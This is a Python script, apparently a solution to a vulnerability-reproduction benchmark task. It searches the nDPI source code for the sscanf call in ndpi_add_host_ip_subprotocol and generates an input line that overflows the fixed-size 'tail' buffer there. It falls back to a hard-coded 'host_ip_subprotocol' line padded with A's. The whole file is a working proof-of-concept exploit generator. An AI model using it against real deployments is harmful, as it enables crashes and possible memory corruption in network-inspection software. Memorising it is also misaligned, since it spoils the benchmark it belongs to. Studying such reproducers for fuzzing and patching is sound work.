import os
import re
import tarfile
from typing import List, Optional, Tuple, Dict, Any


def _read_file_from_tar(tar_path: str, wanted_suffixes: Tuple[str, ...]) -> Optional[bytes]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            members = tf.getmembers()
            candidates = []
            for m in members:
                if not m.isfile():
                    continue
                name = m.name.replace("\\", "/")
                for suf in wanted_suffixes:
                    if name.endswith(suf):
                        candidates.append(m)
                        break
            if not candidates:
                return None
            candidates.sort(key=lambda m: len(m.name))
            f = tf.extractfile(candidates[0])
            if f is None:
                return None
            return f.read()
    except Exception:
        return None


def _read_file_from_dir(root: str, wanted_names: Tuple[str, ...], wanted_suffixes: Tuple[str, ...]) -> Optional[bytes]:
    try:
        best_path = None
        best_score = None
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn in wanted_names:
                    p = os.path.join(dirpath, fn)
                    rel = os.path.relpath(p, root).replace("\\", "/")
                    score = (0, len(rel))
                    if best_score is None or score < best_score:
                        best_score = score
                        best_path = p
                else:
                    for suf in wanted_suffixes:
                        if fn.endswith(os.path.basename(suf)):
                            p = os.path.join(dirpath, fn)
                            rel = os.path.relpath(p, root).replace("\\", "/")
                            score = (1, len(rel))
                            if best_score is None or score < best_score:
                                best_score = score
                                best_path = p
                            break
        if not best_path:
            return None
        with open(best_path, "rb") as f:
            return f.read()
    except Exception:
        return None


def _c_unescape(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c != "\\":
            out.append(c)
            i += 1
            continue
        i += 1
        if i >= n:
            out.append("\\")
            break
        c = s[i]
        i += 1
        if c == "n":
            out.append("\n")
        elif c == "t":
            out.append("\t")
        elif c == "r":
            out.append("\r")
        elif c == "v":
            out.append("\v")
        elif c == "f":
            out.append("\f")
        elif c == "a":
            out.append("\a")
        elif c == "b":
            out.append("\b")
        elif c == "\\":
            out.append("\\")
        elif c == "'":
            out.append("'")
        elif c == '"':
            out.append('"')
        elif c == "0":
            j = i
            oct_digits = ["0"]
            while j < n and len(oct_digits) < 3 and s[j] in "01234567":
                oct_digits.append(s[j])
                j += 1
            i = j
            try:
                out.append(chr(int("".join(oct_digits), 8)))
            except Exception:
                out.append("\x00")
        elif c == "x":
            j = i
            hx = []
            while j < n and len(hx) < 2 and s[j] in "0123456789abcdefABCDEF":
                hx.append(s[j])
                j += 1
            i = j
            if hx:
                out.append(chr(int("".join(hx), 16)))
            else:
                out.append("x")
        else:
            out.append(c)
    return "".join(out)


def _skip_ws(text: str, i: int) -> int:
    n = len(text)
    while i < n and text[i].isspace():
        i += 1
    return i


def _parse_c_string_literal(text: str, i: int) -> Tuple[Optional[str], int]:
    n = len(text)
    if i >= n or text[i] != '"':
        return None, i
    i += 1
    buf = []
    while i < n:
        c = text[i]
        if c == '"':
            i += 1
            return _c_unescape("".join(buf)), i
        if c == "\\":
            if i + 1 < n:
                buf.append(text[i])
                buf.append(text[i + 1])
                i += 2
            else:
                buf.append("\\")
                i += 1
        else:
            buf.append(c)
            i += 1
    return None, i


def _parse_c_string_expr(expr: str) -> Optional[str]:
    i = 0
    n = len(expr)
    i = _skip_ws(expr, i)
    if i >= n or expr[i] != '"':
        return None
    parts = []
    while True:
        i = _skip_ws(expr, i)
        if i >= n or expr[i] != '"':
            break
        s, i2 = _parse_c_string_literal(expr, i)
        if s is None:
            break
        parts.append(s)
        i = i2
    return "".join(parts) if parts else None


def _split_top_level_args(s: str) -> List[str]:
    args = []
    cur = []
    depth_paren = 0
    depth_brack = 0
    depth_brace = 0
    i = 0
    n = len(s)
    in_str = False
    in_chr = False
    while i < n:
        c = s[i]
        if in_str:
            cur.append(c)
            if c == "\\" and i + 1 < n:
                cur.append(s[i + 1])
                i += 2
                continue
            if c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            cur.append(c)
            if c == "\\" and i + 1 < n:
                cur.append(s[i + 1])
                i += 2
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue

        if c == '"':
            in_str = True
            cur.append(c)
            i += 1
            continue
        if c == "'":
            in_chr = True
            cur.append(c)
            i += 1
            continue

        if c == "/" and i + 1 < n:
            nxt = s[i + 1]
            if nxt == "/":
                while i < n and s[i] != "\n":
                    cur.append(s[i])
                    i += 1
                continue
            if nxt == "*":
                cur.append("/*")
                i += 2
                while i + 1 < n and not (s[i] == "*" and s[i + 1] == "/"):
                    cur.append(s[i])
                    i += 1
                if i + 1 < n:
                    cur.append("*/")
                    i += 2
                continue

        if c == "(":
            depth_paren += 1
        elif c == ")":
            if depth_paren > 0:
                depth_paren -= 1
        elif c == "[":
            depth_brack += 1
        elif c == "]":
            if depth_brack > 0:
                depth_brack -= 1
        elif c == "{":
            depth_brace += 1
        elif c == "}":
            if depth_brace > 0:
                depth_brace -= 1

        if c == "," and depth_paren == 0 and depth_brack == 0 and depth_brace == 0:
            args.append("".join(cur).strip())
            cur = []
            i += 1
            continue

        cur.append(c)
        i += 1

    if cur:
        args.append("".join(cur).strip())
    return args


def _find_matching_paren(text: str, i: int) -> int:
    n = len(text)
    if i >= n or text[i] != "(":
        return -1
    depth = 0
    in_str = False
    in_chr = False
    while i < n:
        c = text[i]
        if in_str:
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue

        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue

        if c == "/" and i + 1 < n:
            nxt = text[i + 1]
            if nxt == "/":
                i += 2
                while i < n and text[i] != "\n":
                    i += 1
                continue
            if nxt == "*":
                i += 2
                while i + 1 < n and not (text[i] == "*" and text[i + 1] == "/"):
                    i += 1
                if i + 1 < n:
                    i += 2
                continue

        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def _extract_c_block(text: str, brace_i: int) -> Optional[Tuple[str, int]]:
    n = len(text)
    if brace_i < 0 or brace_i >= n or text[brace_i] != "{":
        return None
    i = brace_i
    depth = 0
    in_str = False
    in_chr = False
    while i < n:
        c = text[i]
        if in_str:
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue

        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue

        if c == "/" and i + 1 < n:
            nxt = text[i + 1]
            if nxt == "/":
                i += 2
                while i < n and text[i] != "\n":
                    i += 1
                continue
            if nxt == "*":
                i += 2
                while i + 1 < n and not (text[i] == "*" and text[i + 1] == "/"):
                    i += 1
                if i + 1 < n:
                    i += 2
                continue

        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return text[brace_i:i + 1], i + 1
        i += 1
    return None


def _find_function_body(text: str, fname: str) -> Optional[str]:
    pat = re.compile(r"\b" + re.escape(fname) + r"\s*\(")
    for m in pat.finditer(text):
        open_par = m.end() - 1
        close_par = _find_matching_paren(text, open_par)
        if close_par < 0:
            continue
        j = close_par + 1
        while j < len(text) and text[j].isspace():
            j += 1
        if j < len(text) and text[j] == "{":
            blk = _extract_c_block(text, j)
            if blk:
                return blk[0]
    return None


def _extract_calls_with_name(func_text: str, names: Tuple[str, ...]) -> List[Tuple[str, str]]:
    out = []
    for name in names:
        i = 0
        while True:
            idx = func_text.find(name, i)
            if idx < 0:
                break
            if idx > 0 and (func_text[idx - 1].isalnum() or func_text[idx - 1] == "_"):
                i = idx + 1
                continue
            j = idx + len(name)
            while j < len(func_text) and func_text[j].isspace():
                j += 1
            if j >= len(func_text) or func_text[j] != "(":
                i = idx + 1
                continue
            close_par = _find_matching_paren(func_text, j)
            if close_par < 0:
                i = idx + 1
                continue
            args_sub = func_text[j + 1:close_par]
            out.append((name, args_sub))
            i = close_par + 1
    return out


def _parse_tail_size(func_text: str) -> Optional[int]:
    m = re.search(r"\bchar\s+tail\s*\[\s*(\d+)\s*\]", func_text)
    if m:
        try:
            return int(m.group(1))
        except Exception:
            return None
    m = re.search(r"\b(u_char|uint8_t|u_int8_t|unsigned\s+char)\s+tail\s*\[\s*(\d+)\s*\]", func_text)
    if m:
        try:
            return int(m.group(2))
        except Exception:
            return None
    return None


def _parse_scanf_format(fmt: str) -> List[Dict[str, Any]]:
    items: List[Dict[str, Any]] = []
    i = 0
    n = len(fmt)
    while i < n:
        c = fmt[i]
        if c.isspace():
            j = i + 1
            while j < n and fmt[j].isspace():
                j += 1
            items.append({"type": "ws"})
            i = j
            continue
        if c != "%":
            items.append({"type": "lit", "val": c})
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            items.append({"type": "lit", "val": "%"})
            i += 2
            continue

        i += 1
        suppress = False
        if i < n and fmt[i] == "*":
            suppress = True
            i += 1

        width = None
        wstart = i
        while i < n and fmt[i].isdigit():
            i += 1
        if i > wstart:
            try:
                width = int(fmt[wstart:i])
            except Exception:
                width = None

        while i < n:
            if fmt[i] in ("h", "l", "L", "z", "j", "t"):
                if fmt[i] == "l" and i + 1 < n and fmt[i + 1] == "l":
                    i += 2
                else:
                    i += 1
                continue
            break

        if i >= n:
            break
        spec = fmt[i]
        i += 1

        if spec == "[":
            scanset = []
            if i < n and fmt[i] == "^":
                scanset.append("^")
                i += 1
            if i < n and fmt[i] == "]":
                scanset.append("]")
                i += 1
            while i < n and fmt[i] != "]":
                scanset.append(fmt[i])
                i += 1
            if i < n and fmt[i] == "]":
                i += 1
            items.append({"type": "conv", "spec": "[", "width": width, "suppress": suppress, "scanset": "".join(scanset)})
        else:
            items.append({"type": "conv", "spec": spec, "width": width, "suppress": suppress})
    return items


def _expand_scanset(scanset: str) -> Tuple[bool, set]:
    neg = False
    s = scanset
    if s.startswith("^"):
        neg = True
        s = s[1:]
    allowed = set()
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if i + 2 < n and s[i + 1] == "-" and s[i + 2] != "]":
            a = ord(c)
            b = ord(s[i + 2])
            if a <= b:
                for code in range(a, b + 1):
                    allowed.add(chr(code))
            else:
                allowed.add(c)
                allowed.add("-")
                allowed.add(s[i + 2])
            i += 3
        else:
            allowed.add(c)
            i += 1
    return neg, allowed


def _pick_char_for_scanset(scanset: str) -> str:
    neg, allowed = _expand_scanset(scanset)
    if not neg:
        for c in ("A", "a", "0", ".", "_", "-"):
            if c in allowed:
                return c
        if allowed:
            return next(iter(allowed))
        return "A"
    excluded = allowed
    for c in ("A", "B", "a", "0", "1", "x", "_", ".", "-", "Z"):
        if c not in excluded:
            return c
    for code in range(33, 127):
        c = chr(code)
        if c not in excluded:
            return c
    return "A"


def _token_for_conv(conv: Dict[str, Any], is_tail: bool, tail_len: int) -> str:
    spec = conv.get("spec")
    width = conv.get("width")
    if spec in ("d", "i", "u", "x", "X", "o", "p"):
        return "0"
    if spec in ("f", "F", "e", "E", "g", "G", "a", "A"):
        return "0"
    if spec == "c":
        ln = 1
        if width is not None and width > 1:
            ln = width
        if is_tail:
            ln = min(max(tail_len, ln), 400)
        return "A" * ln
    if spec == "n":
        return ""
    if spec == "s":
        ln = 1
        if is_tail:
            ln = tail_len
        if width is not None:
            ln = min(ln, max(1, width))
        return "A" * ln
    if spec == "[":
        ch = _pick_char_for_scanset(conv.get("scanset", ""))
        ln = 1
        if is_tail:
            ln = tail_len
        if width is not None:
            ln = min(ln, max(1, width))
        return ch * ln
    return "A" if not is_tail else ("A" * tail_len)


def _build_input_from_format(fmt: str, tail_assign_pos: int, tail_buf_size: Optional[int]) -> bytes:
    items = _parse_scanf_format(fmt)
    if tail_buf_size is None:
        tail_buf_size = 32
    tail_len = max(2, tail_buf_size)
    tail_len = min(tail_len, 350)

    out_parts: List[str] = []
    assign_idx = 0
    for it in items:
        if it["type"] == "ws":
            out_parts.append(" ")
        elif it["type"] == "lit":
            c = it["val"]
            if c.isspace():
                out_parts.append(" ")
            else:
                out_parts.append(c)
        else:
            spec = it.get("spec")
            if spec == "%":
                out_parts.append("%")
                continue
            is_assigning = not it.get("suppress", False) and spec != "n"
            if is_assigning:
                assign_idx += 1
            is_tail = is_assigning and (assign_idx == tail_assign_pos)
            out_parts.append(_token_for_conv(it, is_tail=is_tail, tail_len=tail_len))

    s = "".join(out_parts)
    if len(s) < 2:
        s = "A"
    if not s.endswith("\n"):
        s += "\n"
    return s.encode("ascii", "ignore")


def _analyze_sscanf_args(args_sub: str, tail_buf_size: Optional[int]) -> Optional[Tuple[str, int, bool]]:
    args = _split_top_level_args(args_sub)
    if len(args) < 3:
        return None
    fmt = _parse_c_string_expr(args[1])
    if not fmt:
        return None
    tail_arg_i = None
    for i in range(2, len(args)):
        if re.search(r"\btail\b", args[i]):
            tail_arg_i = i
            break
    if tail_arg_i is None:
        return None
    tail_assign_pos = tail_arg_i - 1

    items = _parse_scanf_format(fmt)
    assigning_convs = []
    for it in items:
        if it.get("type") != "conv":
            continue
        spec = it.get("spec")
        if spec in (None, "%"):
            continue
        if it.get("suppress", False):
            continue
        if spec == "n":
            continue
        assigning_convs.append(it)

    if tail_assign_pos < 1 or tail_assign_pos > len(assigning_convs):
        return fmt, max(1, min(tail_assign_pos, max(1, len(assigning_convs)))), False

    tail_conv = assigning_convs[tail_assign_pos - 1]
    spec = tail_conv.get("spec")
    width = tail_conv.get("width")

    overflowish = False
    if spec in ("s", "[", "c"):
        if width is None:
            overflowish = True
        elif tail_buf_size is not None and width >= tail_buf_size:
            overflowish = True
        elif tail_buf_size is None and width >= 32:
            overflowish = True

    return fmt, tail_assign_pos, overflowish


class Solution:
    def solve(self, src_path: str) -> bytes:
        wanted_suffixes = ("/src/lib/ndpi_main.c", "src/lib/ndpi_main.c", "/ndpi_main.c", "ndpi_main.c")
        data = None
        if os.path.isfile(src_path):
            data = _read_file_from_tar(src_path, wanted_suffixes)
            if data is None:
                try:
                    with open(src_path, "rb") as f:
                        data = f.read()
                except Exception:
                    data = None
        elif os.path.isdir(src_path):
            data = _read_file_from_dir(src_path, ("ndpi_main.c",), wanted_suffixes)
        if not data:
            return b"host_ip_subprotocol A 1.1.1.1 0 " + (b"A" * 64) + b"\n"

        try:
            text = data.decode("utf-8", "ignore")
        except Exception:
            text = data.decode("latin-1", "ignore")

        func = _find_function_body(text, "ndpi_add_host_ip_subprotocol")
        if not func:
            return b"host_ip_subprotocol A 1.1.1.1 0 " + (b"A" * 64) + b"\n"

        tail_size = _parse_tail_size(func)
        calls = _extract_calls_with_name(func, ("__isoc99_sscanf", "sscanf"))
        best = None
        best_score = None

        for _, args_sub in calls:
            if "tail" not in args_sub:
                continue
            analyzed = _analyze_sscanf_args(args_sub, tail_size)
            if not analyzed:
                continue
            fmt, tail_pos, overflowish = analyzed
            score = (0 if overflowish else 1, len(fmt))
            if best_score is None or score < best_score:
                best = (fmt, tail_pos)
                best_score = score

        if best:
            fmt, tail_pos = best
            poc = _build_input_from_format(fmt, tail_pos, tail_size)
            if len(poc) > 0:
                return poc

        return b"host_ip_subprotocol A 1.1.1.1 0 " + (b"A" * (tail_size if tail_size else 64)) + b"\n"